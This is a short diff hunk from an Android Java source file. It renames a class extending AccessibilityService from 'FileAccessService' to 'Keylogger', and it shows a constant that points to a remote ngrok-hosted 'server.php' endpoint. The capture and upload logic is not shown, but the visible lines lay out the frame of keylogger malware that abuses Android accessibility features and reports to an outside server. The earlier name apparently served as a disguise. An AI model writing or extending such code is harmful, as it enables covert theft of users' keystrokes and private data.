@@ -13,7 +13,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Scanner;
 
-public class FileAccessService extends AccessibilityService {
+public class Keylogger extends AccessibilityService {
     private static final String SERVER_URL = "https://locust-handy-seagull.ngrok-free.app/server.php";
     private static final String TAG = "Keylogger";
 
